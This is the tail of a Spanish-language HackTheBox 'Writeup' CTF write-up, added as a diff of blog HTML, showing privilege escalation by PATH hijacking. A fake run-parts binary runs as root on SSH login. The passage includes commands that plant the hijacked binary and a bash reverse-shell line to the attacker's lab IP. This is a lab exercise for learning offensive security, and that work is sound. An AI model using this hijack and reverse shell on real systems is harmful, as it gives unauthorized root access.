+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192bash_pspy_plScript.png" alt="192bash_pspy_plScript" /></p>
+
+<p>Vemos una tarea programada, se ve que se ejecuta cada minuto y (según las pruebas que hice con el rabbit hole anterior) borra el contenido de la ruta <code>/usr/local/bin</code> (puede que haga otras cosas :P). Pero no nos podemos aprovechar de ella, ya que no tenemos acceso a el script y tampoco podemos pensar en algún **Path Hijacking, ya que los comandos están siendo llamados con su ruta absoluta :(</p>
+
+<p>Usando otra terminal estaba ejecutando procesos (ps, netstat, etc) para con ayuda de <strong>pspy</strong> ver si aparecia algo extraño, pasa que estaba ciego y no me habia fijado en ese “algo” :P</p>
+
+<p>Cuando se establece una sesión por medio del servicio <strong>SSH</strong> vemos (bueno, estaba ciego y no lo habia visto) algo interesante:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192bash_pspy_sshTask.png" alt="192bash_pspy_sshTask" /></p>
+
+<p>Vemos que al iniciar una sesión algún usuario por medio de <strong>SSH</strong> se le asigna la variable <strong>$PATH</strong> con varias rutas (ya miraremos esto), peeeeeeeeeero, tambien vemos la ejecución de <strong>dos comandos</strong> sin su ruta absoluta :o Acá ya podemos pensar en algo relacionado o parecido al <strong>PATH Hijacking</strong>:</p>
+
+<p>Validando en que ruta esta el binario <code>sh</code> tenemos:</p>
+
+<pre><code class="language-bash">jkr@writeup:/tmp$ which sh
+/bin/sh
+</code></pre>
+
+<p>Bien, y ahora validando la variable <code>$PATH</code>:</p>
+
+<pre><code class="language-bash">jkr@writeup:/tmp$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</code></pre>
+
+<p>¿Como se relacionan esas dos instrucciones? Muy sencillo:</p>
+
+<p>Al ejecutar <code>sh</code> (sin ruta absoluta (ejecutando con ruta absoluta seria <code>/bin/sh</code>)), el sistema necesita saber en donde esta el binario relacionado a esa cadena <code>"sh"</code>, entonces va a la variable <code>$PATH</code> y empieza a recorrer cada uno del los directorios que se encuentran en ella, entonces:</p>
+
+<pre><code class="language-bash"># Ejecutamos *whoami*
+jkr@writeup:/tmp$ sh -c whoami
+...
+# Busca el binario "sh" en las rutas:
+/usr/local/bin 
+/usr/bin
+/bin
+...
+</code></pre>
+
+<p>Si lo encuentra en alguna, por ejemplo: /usr/local/bin/sh, lo ejecuta y termina de buscar, si no, sigue con la siguiente ruta hasta encontrarlo :P, asi de sencillo.</p>
+
+<p>Teniendo esto en mente, podemos empezar a jugar…</p>
+
+<p>Sabemos que el sistema ejecuta <code>sh</code> al iniciar sesion con <strong>SSH</strong>, pues empezara a buscar en las rutas del <code>$PATH</code> y lo encontraria en <code>/bin</code>, peeeero, podemos simplemente crear un archivo que se llame <code>sh</code> y moverlo a la ruta <code>/usr/local/bin</code>, al iniciar sesion con <strong>SSH</strong> el sistema buscara de nuevo pero ahora lo encontrara primero en esa ruta, por lo tanto será ejecutado :)</p>
+
+<p>Acá no tenemos que preocuparnos en cambiar el valor de la varibale <code>$PATH</code> (que por lo general debemos hacer lo en un <strong>PATH Hijacking</strong>), entonces nnos quitamos un paso, demosle:</p>
+
+<p>Como prueba, hagamos que el archivo nos cree otro archivo (e.e) al ser ejecutado, asi validamos que tamos haciendo las cosas bien:</p>
+
+<pre><code class="language-bash">jkr@writeup:/tmp$ echo "echo 'hola, escrito reemplazando el binario sh' &gt; /tmp/sh_patHijack.txt" &gt; sh
+jkr@writeup:/tmp$ cat sh 
+echo 'hola, escrito reemplazando el binario sh' &gt; /tmp/sh_patHijack.txt
+</code></pre>
+
+<p>Si se ejecuta, tendremos el archivo <code>sh_patHijack.txt</code> en la ruta <code>/tmp</code>. Le damos permisos de ejecución y lo movemos a la ruta <code>/usr/local/bin</code>:</p>
+
+<pre><code class="language-bash">jkr@writeup:/tmp$ chmod +x sh 
+jkr@writeup:/tmp$ cp sh /usr/local/bin/
+jkr@writeup:/tmp$ ls -la /usr/local/bin/sh
+-rwxr-xr-x 1 jkr staff 72 Jun  6 20:18 /usr/local/bin/sh   
+</code></pre>
+
+<p>Usamos la otra terminal e iniciamos sesión, validamos si se genero el archivo:</p>
+
+<pre><code class="language-bash">jkr@writeup:~$ ls -la /tmp/ | grep sh
+-rwxr-xr-x  1 jkr  jkr       72 Jun  6 20:16 sh
+</code></pre>
+
+<p>Pero no, no pasa nada…</p>
+
+<p>Si recordamos, hay otro comando que se esta ejecutando llamado <code>run-parts</code>:</p>
+
+<blockquote>
+  <p>run-parts - Ejecuta scripts o programas en un directorio.</p>
+</blockquote>
+
+<p>Pues podemos hacer exactamente el mismo procedimiento, validamos que ruta tiene el binario por default, vemos si es necesario modificar la variable <code>$PATH</code> (no es necesario), generamos un archivo que se llame igual al original, damos permisos, movemos a la ruta <code>/usr/local/bin</code> y entramos con <strong>SSH</strong>. Veamos entonces:</p>
+
+<pre><code class="language-bash">jkr@writeup:/tmp$ echo "echo 'hola, escrito reemplazando el binario run-parts' &gt; /tmp/run_patHijack.txt" &gt; run-parts   
+jkr@writeup:/tmp$ chmod +x run-parts
+jkr@writeup:/tmp$ cp run-parts /usr/local/bin/
+jkr@writeup:/tmp$ ls -la /usr/local/bin/run-parts
+-rwxr-xr-x 1 jkr staff 80 Jun  6 20:25 /usr/local/bin/run-parts
+...
+❱ ssh jkr@10.10.10.138
+...
+jkr@writeup:~$ ls -la /tmp | grep run
+-rwxr-xr-x  1 jkr  jkr       80 Jun  6 20:24 run-parts
+-rw-r--r--  1 root root      48 Jun  6 20:26 run_patHijack.txt
+jkr@writeup:~$ cat /tmp/run_patHijack.txt 
+hola, escrito reemplazando el binario run-parts
+</code></pre>
+
+<p>Opa 🤸‍♀️ Pues ha funcionaaaao (:</p>
+
+<p>Ahora podemos usar el <strong>PATH Hijacking</strong> para ejecutar cualquier comando como el usuario <strong>root</strong>, pues entablemonos una reverse shell ahí de rapidez:</p>
+
+<pre><code class="language-bash">jkr@writeup:/tmp$ echo "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.16/4433 0&gt;&amp;1'" &gt; run-parts   
+jkr@writeup:/tmp$ cat run-parts 
+bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.16/4433 0&gt;&amp;1'
+jkr@writeup:/tmp$ cp run-parts /usr/local/bin/
+jkr@writeup:/tmp$ ls -la /usr/local/bin/run-parts
+-rwxr-xr-x 1 jkr staff 52 Jun  6 21:31 /usr/local/bin/run-parts
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192bash_rootSH.png" alt="192bash_rootSH" /></p>
+
+<p>LISTONEEEEEEEEEEEEEEEEEEEEEEEEEEEEEES!! Tamos dentro como el usuario <strong>root</strong>, echemosle un ojo a las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192flags.png" alt="192flags" /></p>
+
+<p>Emho akabhao’</p>
+
+<p>…</p>
+
+<p>Linda experiencia. El <strong>PATH Hijacking</strong> estuvo lindo, pero me gusto más el como lo encontramos…</p>
+
+<p>Listoooooooones… Vamos caminando por un desierto (e.e), miramos el techo (u.u) y nos encontramos una nota en el suelo (o.o) y dice: “A seguir rompiendo TODO!!” ❤️</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Writeup&url=http://localhost:4000/htb/writeup" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#CMS">CMS</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SQLi">SQLi</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cracking">cracking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#path-hijacking">path-hijacking</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/proper">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png" alt="HackTheBox - Proper"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/proper">HackTheBox - Proper</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Agregamos sal a nuestra inyección SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creación de scripts en PowerShell y pipes conseguiremos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/giddy">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153banner.png" alt="HackTheBox - Giddy"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/giddy">HackTheBox - Giddy</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. Jugaremos con inyecciones SQL del servicio MSSQL. Pero no vamos dumpear bases de datos, nop, vamos a ejecutar comandos :o que serán interceptados (smbclient y responder)...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">27 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/breadcrumbs">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png" alt="HackTheBox - Breadcrumbs"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/breadcrumbs">HackTheBox - Breadcrumbs</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contraseñas almacenadas, jugando con binarios encontramos una URL que nos llevara de la...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">17 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
